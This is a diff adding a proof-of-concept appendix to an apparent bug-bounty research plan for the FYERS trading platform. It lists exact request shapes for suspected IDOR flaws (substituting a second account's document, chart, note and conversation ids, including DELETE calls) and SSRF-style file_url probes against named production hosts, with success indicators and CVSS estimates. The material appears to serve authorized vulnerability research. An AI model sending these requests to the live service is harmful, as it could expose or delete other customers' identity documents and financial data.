@@ -121,3 +121,79 @@ auth-error. Two accounts must be researcher-owned; no other user's data touched.
 No OTP/SMS/email dispatch to any number. No cross-account access by researcher. No high-volume or
 automated scanning. No rate-limit bypass. No market-hours trading-system actions. Own-account PoCs
 only. Submissions only via official form. Strict confidentiality (no external disclosure).
+
+## E. POC request-format appendix (exact shapes — FYERS-side / own-account validation only)
+Reference implementation for the designs in section A. Every request below is a
+DOCUMENTED SHAPE, not an executed action. Parameterize all ids/tokens. Run each
+baseline on the researcher's OWN session first; substitution step uses the SECOND
+researcher-owned account's object id ONLY per A. method. None of these are live.
+
+### E1 (A1/H17 signup/v2 req_id substitution) — base https://api-a1.fyers.in
+- Session: signup/v2 authenticated session for applicant A (own account), header `x-validate` is
+  client-side HMAC (informational; not required for validation of object scoping).
+- Shape 1 POST /signup/v2/user/esign-document
+  body {"digio_doc_id":"<APPLICANT_B_REQ_ID>","source":"esign"}   (or the live-verification
+  query form: /signup/v2/user/esign-document?source=esign&req_id=<APPLICANT_B_REQ_ID>)
+- Shape 2 POST /signup/v2/user/pdf/generate  body {"req_id":"<APPLICANT_B_REQ_ID>",...}
+- Shape 3 POST /signup/v2/user/pdf/poll      body {"req_id":"<APPLICANT_B_REQ_ID>",...}
+- Shape 4 GET  /signup/v2/user/status/poll?req_id=<APPLICANT_B_REQ_ID>
+- Shape 5 GET  /signup/v2/nri/get-document?req_id=<APPLICANT_B_REQ_ID>&doc=<name>
+- Baseline: repeat with APPLICANT_A_REQ_ID (own) → expect non-empty eSign/PDF/status payload.
+- Success indicator: with B's req_id, A's session returns a non-empty document/PDF/status
+  object (any 2xx with data). FIXED: 403/404/401/session-expired or "not found" for B's id.
+- Safe: no account created, no OTP dispatched, no eSign action executed; only object-id
+  substitution on A's own authenticated session responses.
+
+### E2 (A2/H13 savedcharts object-keyed IDOR) — base https://data.fyers.in
+- Shape 1 GET /dev-fyers/savechart/1.2/charts (own chart list; `_FYERS` cookie)
+- Shape 2 GET /dev-fyers/savechart/1.2/charts/<OWN_CHART_ID>
+- Shape 3 GET /dev-fyers/savechart/1.2/charts/<SECOND_ACCOUNT_CHART_ID>
+- Shape 4 DELETE /dev-fyers/savechart/1.2/charts/<SECOND_ACCOUNT_CHART_ID>
+- Shape 5 GET /dev-fyers/savechart/1.2/study_templates/<FOREIGN_TEMPLATE_ID>
+- Auth: `_FYERS` session cookie (savedcharts.fyers.in login) ONLY. No cross-account login.
+- Success: 200-with-data on foreign chart id; FIXED: 403/404/empty.
+
+### E3 (A3/H15 marina/ddpi instruction-object IDOR) — baseline https://api-a1.fyers.in
+- Shape 1 GET  /marina/v1/ddpi/user/listing (own instructions)
+- Shape 2 GET  /marina/v1/ddpi/status?instruction_id=<OWN>
+- Shape 3 GET  /marina/v1/ddpi/status?instruction_id=<SECOND_ACCOUNT_INSTRUCTION_ID>
+- Shape 4 GET  /marina/v1/ddpi/timeline?instruction_id=<SECOND_ACCOUNT_INSTRUCTION_ID>
+- Success: foreign instruction status/timeline/file returned; FIXED: 403/404/-16-scoped.
+
+### E4 (A4/H18 journal-server note/upload) — base https://api-a1-prod.fyers.in
+- Header on all: Authorization: Bearer <OWN_SESSION_TOKEN>
+- Shape 1 GET  /journal-server/v1/notes-list?date=<TODAY_ISO>            (own)
+- Shape 2 GET  /journal-server/v1/note/detail?note_ids=<OWN_NOTE_ID>&gs=  (own)
+- Shape 3 GET  /journal-server/v1/note/detail?note_ids=<SECOND_ACCOUNT_NOTE_ID>&gs=
+- Shape 4 GET  /journal-server/v1/note/detail?note_ids=<SECOND_ACCOUNT_DOCID>&gs=(document id)
+- Success: B's note/document payload in A's response; FIXED: 403 {"code":401...} / 404.
+
+### E5 (A5/H19 api-testing-prod unauth upload tier) — base https://api-testing-prod.fyers.in
+- NOTE: scope-confirm first (C2). No file payload or external URL fetch should be performed by
+  the researcher; these are the service-side validation probes.
+- Shape 1 POST /signup/upload/api/v1/user/general/upload-image
+   body {"file":"<MINIMAL_1x1_PNG_or_set of null>","fileName":"<NAME>","key":"<KEY>"}
+- Shape 2 POST /signup/upload/api/v1/user/fetch-pan
+   body {"base64_image":"<NULL/EMPTY>","fileName":"<NAME>","key":"<KEY>"}
+- Shape 3 POST /signup/upload/signature-to-bmp
+   body {"base64_image":"<NULL/EMPTY>","fileName":"<NAME>","key":"user/signature/bmp"}
+- Shape 4 POST /signup/upload/api/v1/pdf/is-password-protected
+   body {"file_url":"http://127.0.0.1:1/x.pdf"}          (connection-refused oracle)
+   body {"file_url":"https://api-t1.fyers.in/"}           (in-scope internal fetch oracle)
+   body {"file_url":"not-a-url"}                            (validation oracle)
+- Shape 5 POST /signup/upload/api/v1/user/general/zip-all-images (expected 200 no-auth no-op)
+- Success indicators: distinct status/body across file_url cases (proves server fetch);
+  foreign-object read/zip includes a caller-uploaded object → unauth write. FIXED: token
+  rejection / allow-listed hosts / session-bound keys.
+
+### E6 (A6/H21 nucleus/v1 object-keyed IDOR) — base https://api-t1.fyers.in
+- Header all: Authorization: Bearer <USER_SESSION_TOKEN>, version: 1.0.0
+- Shape 1 GET  /nucleus/v1/history/{OWN_CID}              (baseline)
+- Shape 2 GET  /nucleus/v1/history/{SECOND_ACCOUNT_CID}
+- Shape 3 DELETE /nucleus/v1/drawings/{A}/{B}  (own drawing key → foreign key substitution)
+- Shape 4 POST /nucleus/v1/chat  body {"cid":"<FOREIGN_CID>","prompt":"<EMPTY>||<DOC_QUERY>"}
+- Success: foreign conversation/drawing object in response; FIXED: 403/404/empty.
+
+## CVSS (program rubric governs; CVSS reference only)
+- A1/H17 8.1–9.1 (Critical/High if unmasked PAN/eSign/PDF) · A5/H19 5.3–7.5 (Medium–High)
+- A2/H13, A3/H15, A4/H18 5.3–7.5; A6/H21 5.3–6.5 — all conditional on FYERS-side validation
